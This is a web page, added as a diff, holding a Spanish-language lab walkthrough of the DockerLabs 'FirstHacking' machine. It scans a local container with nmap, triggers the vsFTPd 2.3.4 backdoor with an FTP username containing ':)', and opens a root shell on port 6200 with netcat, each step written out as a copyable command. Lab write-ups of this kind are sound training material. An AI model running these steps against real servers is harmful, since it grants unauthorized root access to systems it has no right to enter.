@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FirstHacking — Dockerlabs Writeup | Brandeiks</title>
+  <meta name="description" content="DockerLabs muy facil: nmap detecta vsFTPd 2.3.4 en el puerto 21 y el backdoor de la version troyanizada abre una shell como root en el 6200 tras autenticarse con un usuario que contiene la secuencia de dos puntos y parentesis.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/dockerlabs/muy-facil/firsthacking.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="FirstHacking — Dockerlabs Writeup | Brandeiks">
+  <meta property="og:description" content="DockerLabs muy facil: nmap detecta vsFTPd 2.3.4 en el puerto 21 y el backdoor de la version troyanizada abre una shell como root en el 6200 tras autenticarse con un usuario que contiene la secuencia de dos puntos y parentesis.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/dockerlabs/muy-facil/firsthacking.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/firsthacking.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="FirstHacking — Dockerlabs Writeup | Brandeiks">
+  <meta name="twitter:description" content="DockerLabs muy facil: nmap detecta vsFTPd 2.3.4 en el puerto 21 y el backdoor de la version troyanizada abre una shell como root en el 6200 tras autenticarse con un usuario que contiene la secuencia de dos puntos y parentesis.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/firsthacking.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "FirstHacking — Dockerlabs Writeup | Brandeiks", "description": "DockerLabs muy facil: nmap detecta vsFTPd 2.3.4 en el puerto 21 y el backdoor de la version troyanizada abre una shell como root en el 6200 tras autenticarse con un usuario que contiene la secuencia de dos puntos y parentesis.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/dockerlabs/muy-facil/firsthacking.html", "image": "https://brandeiks.github.io/assets/og/firsthacking.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/dockerlabs/muy-facil/firsthacking.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+</head>
+<body>
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+  <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+  <a href="../../../index.html" class="nav-back">INICIO</a>
+  <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+  <a href="../../../comandos/index.html" class="nav-back">COMANDOS</a>
+</nav>
+<div class="writeup-hero">
+  <div class="hero-grid"></div><div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
+      <span>firsthacking</span>
+    </div>
+    <h1 class="writeup-title">FIRSTHAC<span>KING</span></h1>
+    <p class="writeup-subtitle">// vsFTPd 2.3.4 con backdoor -&gt; shell como root en el puerto 6200</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span><span class="meta-badge badge-docker">DOCKERLABS</span><span class="meta-badge badge-tech">FTP</span><span class="meta-badge badge-tech">vsftpd</span><span class="meta-badge badge-tech">Backdoor</span><span class="meta-badge badge-tech">Netcat</span><span class="meta-badge badge-tech">Root</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#introduccion">01 · Introducción</a></li>
+        <li><a href="#despliegue-de-la-maquina-vulnerable">02 · Despliegue de la máquina vulnerable</a></li>
+        <li><a href="#escaneo-de-puertos-con-nmap">03 · Escaneo de puertos con Nmap</a></li>
+        <li><a href="#explotacion-del-backdoor-de-vsftpd-2-3-4">04 · Explotación del backdoor de vsFTPd 2.3.4</a></li>
+        <li><a href="#conexion-a-la-shell-del-backdoor-y-escal">05 · Conexión a la shell del backdoor y escalada a root</a></li>
+        <li><a href="#resumen-y-conclusion">06 · Resumen y conclusión</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">FirstHacking</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-green">DOCKERLABS</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-facil">MUY FÁCIL</span></div>
+      <div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">FTP</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">vsftpd</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">Backdoor</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">Netcat</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">Root</span></div>
+    </div>
+  </aside>
+  <main id="main" class="writeup-content">
+    <div class="section" id="introduccion">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Introducción</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p><strong>Autor:</strong> Brandon Zevallos Pastrana <strong>Plataforma:</strong> DockerLabs</p>
+      </div>
+    </div>
+
+    <div class="section" id="despliegue-de-la-maquina-vulnerable">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Despliegue de la máquina vulnerable</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="cd Desktop/dockerLabs/firsthacking &amp;&amp; ls">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">cd Desktop/dockerLabs/firsthacking</span></div>
+<div><span class="prompt">$ </span><span class="cmd">ls</span></div>
+      </div>
+      <div class="output-block">
+        <div>auto_deploy.sh  firsthacking.tar  firsthacking.zip  ip_objetivo.txt</div>
+      </div>
+      <figure class="shot"><img src="../../assets/img/firsthacking.png" loading="lazy" alt="Comandos del writeup firsthacking: cd Desktop/dockerLabs/firsthacking &amp;&amp; ls"><figcaption>BLOQUE DE COMANDOS — tarjeta generada desde el writeup · clic para ampliar</figcaption></figure>
+<div class="cmd-block" data-cmd="sudo bash auto_deploy.sh firsthacking.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">sudo bash auto_deploy.sh firsthacking.tar</span></div>
+      </div>
+      <div class="output-block">
+        <div>[sudo] password for kali:</div>
+        <div></div>
+        <div>Estamos desplegando la máquina vulnerable, espere un momento.</div>
+        <div></div>
+        <div>Máquina desplegada, su dirección IP es → 172.17.0.2</div>
+        <div></div>
+        <div>Presiona Ctrl+C cuando termines con la máquina para eliminarla</div>
+      </div>
+    </div>
+
+    <div class="section" id="escaneo-de-puertos-con-nmap">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Escaneo de puertos con Nmap</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="nmap -sV -p- --min-rate 5000 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">nmap -sV -p- --min-rate 5000 172.17.0.2</span></div>
+      </div>
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 19:31 -0400</div>
+        <div>Nmap scan report for 172.17.0.2</div>
+        <div>Host is up (0.000016s latency).</div>
+        <div>Not shown: 65534 closed tcp ports (reset)</div>
+        <div>PORT   STATE SERVICE VERSION</div>
+        <div>21/tcp open  ftp     vsftpd 2.3.4</div>
+        <div>MAC Address: 1E:D7:D5:1C:AF:79 (Unknown)</div>
+        <div>Service Info: OS: Unix</div>
+        <div></div>
+        <div>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 3.35 seconds</div>
+      </div>
+      <div class="prose">
+        <p><strong>Hallazgo clave:</strong> el puerto 21 corre <strong>vsFTPd 2.3.4</strong>, una versión con una conocida puerta trasera (backdoor) que permite ejecución remota de comandos.</p>
+      </div>
+    </div>
+
+    <div class="section" id="explotacion-del-backdoor-de-vsftpd-2-3-4">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Explotación del backdoor de vsFTPd 2.3.4</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>Se aprovecha la vulnerabilidad del backdoor malicioso insertado en vsFTPd 2.3.4: al autenticarse con un usuario que contenga la secuencia <code>:)</code> en el nombre, el servicio abre una shell en el puerto <strong>6200</strong>.</p>
+      </div>
+      <div class="cmd-block" data-cmd="ftp 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">ftp 172.17.0.2</span></div>
+      </div>
+      <div class="output-block">
+        <div>Connected to 172.17.0.2.</div>
+        <div>220 (vsFTPd 2.3.4)</div>
+        <div>Name (172.17.0.2:kali): AbogadoCibernetico:)</div>
+        <div>331 Please specify the password.</div>
+        <div>Password:</div>
+      </div>
+    </div>
+
+    <div class="section" id="conexion-a-la-shell-del-backdoor-y-escal">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Conexión a la shell del backdoor y escalada a root</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="nc 172.17.0.2 6200">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">nc 172.17.0.2 6200</span></div>
+      </div>
+      <div class="output-block">
+        <div>(UNKNOWN) [172.17.0.2] 6200 (?) : Connection refused</div>
+      </div>
+      <div class="prose">
+        <p>Tras un par de reintentos, la conexión se establece correctamente:</p>
+      </div>
+      <div class="cmd-block" data-cmd="nc 172.17.0.2 6200">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">nc 172.17.0.2 6200</span></div>
+      </div>
+      <div class="cmd-block" data-cmd="whoami">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">whoami</span></div>
+      </div>
+      <div class="output-block">
+        <div>root</div>
+      </div>
+      <div class="cmd-block" data-cmd="cd /root &amp;&amp; ls -la">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">cd /root</span></div>
+<div><span class="prompt">$ </span><span class="cmd">ls -la</span></div>
+      </div>
+      <div class="output-block">
+        <div>total 20</div>
+        <div>drwx------ 1 root root 4096 May  5  2024 .</div>
+        <div>drwxr-xr-x 1 root root 4096 Oct  3 23:27 ..</div>
+        <div>-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc</div>
+        <div>-rw-r--r-- 1 root root  161 Dec  5  2019 .profile</div>
+        <div>drwxr-xr-x 1 root root 4096 May  5  2024 vsftpd-2.3.4</div>
+      </div>
+      <div class="prose">
+        <p><strong>Resultado:</strong> acceso directo como <strong>root</strong> sin necesidad de escalada de privilegios adicional, gracias al backdoor del servicio FTP.</p>
+      </div>
+    </div>
+
+    <div class="section" id="resumen-y-conclusion">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Resumen y conclusión</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p><strong>Resumen:</strong> la máquina *FirstHacking* explota la vulnerabilidad del backdoor de <strong>vsFTPd 2.3.4</strong> (CVE histórico asociado a la versión troyanizada del código fuente). El vector de ataque consiste en:</p>
+      </div>
+      <div class="prose">
+        <p>1. Escanear puertos y detectar el servicio y versión vulnerables. 2. Conectarse por FTP usando un nombre de usuario que contenga <code>:)</code>. 3. Conectarse al puerto 6200, donde el backdoor expone una shell con privilegios de <strong>root</strong>.</p>
+      </div>
+      <div class="prose">
+        <p><strong>Brandon Zevallos Pastrana</strong></p>
+      </div>
+    </div>
+
+  <nav class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="breakmyssh.html"><span class="dir">← ANTERIOR</span><span class="nombre">BreakMySSH</span></a><a class="siguiente" href="../facil/mirame.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Mírame</span></a></nav>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="../../hackthebox/muy-facil/fawn.html"><span class="nombre">Fawn</span><span class="meta">hackthebox · muy-facil · FTP</span></a><a class="rel-card" href="../../hackthebox/muy-facil/overlay.html"><span class="nombre">Overlay</span><span class="meta">hackthebox · muy-facil · Netcat</span></a><a class="rel-card" href="tproot.html"><span class="nombre">Tproot</span><span class="meta">dockerlabs · muy-facil · vsftpd 2.3.4</span></a></div></section>
+</main>
+</div>
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de FirstHacking · Dockerlabs</p>
+  <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+<script>
+  // CURSOR, REVELADO, PROGRESO Y COPIAR (igual que el resto del sitio)
+  const cursor = document.getElementById('cursor'), ring = document.getElementById('cursorRing');
+  let visible = false;
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left = e.clientX + 'px'; ring.style.top = e.clientY + 'px';
+    if (!visible) { visible = true; cursor.style.opacity = '1'; ring.style.opacity = '0.5'; }
+  });
+  document.addEventListener('mouseleave', () => { cursor.style.opacity = '0'; ring.style.opacity = '0'; visible = false; });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup', () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+  const obs = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); }), { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+  const seccionesTOC = document.querySelectorAll('.section[id]');
+  const enlacesTOC = document.querySelectorAll('.toc-list a');
+  const tocObs = new IntersectionObserver(es => es.forEach(e => {
+    if (e.isIntersecting) {
+      enlacesTOC.forEach(a => a.classList.remove('active'));
+      const act = document.querySelector('.toc-list a[href="#' + e.target.id + '"]');
+      if (act) act.classList.add('active');
+    }
+  }), { rootMargin: '-30% 0px -60% 0px' });
+  seccionesTOC.forEach(s => tocObs.observe(s));
+  window.addEventListener('scroll', () => {
+    const h = document.documentElement.scrollHeight - window.innerHeight;
+    const b = document.getElementById('readingProgress');
+    if (b) b.style.width = (h > 0 ? (document.documentElement.scrollTop / h) * 100 : 0) + '%';
+  });
+  function showToast(m) {
+    let t = document.querySelector('.toast');
+    if (!t) { t = document.createElement('div'); t.className = 'toast'; document.body.appendChild(t); }
+    t.textContent = '📋 ' + m; t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2000);
+  }
+  function copyCmd(btn) {
+    const cmd = btn.closest('.cmd-block').dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => { btn.textContent = '✓ OK'; btn.classList.add('copied'); showToast('Comando copiado ✓'); setTimeout(() => { btn.textContent = 'COPIAR'; btn.classList.remove('copied'); }, 1800); });
+  }
+</script>
+<script>window.__datos = {};</script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
